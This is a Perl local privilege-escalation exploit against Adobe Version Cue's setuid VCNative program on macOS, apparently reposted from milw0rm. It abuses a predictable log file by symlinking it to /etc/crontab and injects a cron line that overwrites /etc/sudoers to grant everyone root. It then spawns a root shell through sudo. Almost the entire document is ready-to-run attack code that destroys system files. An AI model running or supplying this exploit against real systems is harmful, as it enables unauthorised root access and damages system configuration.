#!/usr/bin/perl
#
# Adobe Version Cue VCNative[OSX]: local root exploit.
# 
# by: vade79/v9 v9@fakehalo.us (fakehalo/realhalo)
# 
# Adobe Version Cue's VCNative program writes data to a log file in
# the current working directory while running as (setuid) root. the
# logfile is formated as <cwd>/VCNative-<pid>.log, which is easily
# predictable. you may link this file to any file on the system
# and overwrite its contents. use of the "-host" option (with
# "-port") will allow user-supplied data to be injected into the
# file.
#
# This exploit works by overwriting /etc/crontab with
# '* * * * * root echo "ALL ALL=(ALL) ALL">/etc/sudoers' and
# log garbage. within a short period of time crontab will overwrite
# /etc/sudoers and "sudo sh" to root is possible. this method is used
# because direct overwriting of /etc/sudoers will cause sudo to exit
# with configuration errors due to the log garbage, whereas crontab
# will ignore it. (this exploit requires both cron to be running and
# sudo to exist--this is generally default osx)

use POSIX;

$vcn_path="/Applications/Adobe Version Cue/tomcat/webapps/ROOT/" .
"WEB-INF/components/com.adobe.bauhaus.nativecomm/res/VCNative";
$vcn_pid=($$ + 1);
$vcn_cwd="/tmp";
$vcn_tempfile="$vcn_cwd/VCNative-$vcn_pid\.log";
$ovrfile="/etc/crontab";
$ovrstr="* * * * * root echo \\\"ALL ALL=(ALL) ALL\\\">/etc/sudoers";

sub pexit{print("[!] @_.\n");exit(1);}
print("[*] Adobe Version Cue VCNative[OSX]: local root exploit.\n");
print("[*] by: vade79/v9 v9\@fakehalo.us (fakehalo/realhalo)\n\n");
if(!-f $vcn_path){
pexit("VCNative binary doesn't appear to exist");
}
if(!-f"/etc/crontab"||!-f"/etc/sudoers"){
pexit("/etc/crontab and /etc/sudoers are required for this to work");
}
print("[*] sym-linking $ovrfile -> $vcn_tempfile.\n");
symlink($ovrfile,$vcn_tempfile)||pexit("couldn't link files.");
@ast=stat($ovrfile);
print("[*] running VCNative...\n");
system("\"$vcn_path\" -cwd $vcn_cwd -port 1 -host \"\n\n$ovrstr\n\n\"");
print("[*] removing $vcn_tempfile...\n");
unlink($vcn_tempfile);
@st=stat($ovrfile);
if($st[7]==$ast[7]&&$st[9]==$ast[9]){
pexit("$ovrfile was not modified, exploit failed");
}
else{
print("[*] $ovrfile was overwritten successfully...\n");
}
print("[*] waiting for crontab to change /etc/sudoers...\n");
@ast=@st=stat("/etc/sudoers");
while($st[7]==$ast[7]&&$st[9]==$ast[9]){
sleep(1);
@ast=stat("/etc/sudoers");
}
print("[*] /etc/sudoers has been modified.\n");
print("[*] attempting to \"sudo sh\". (use YOUR password)\n");
system("sudo sh");
exit(0);

# milw0rm.com [2005-08-30]
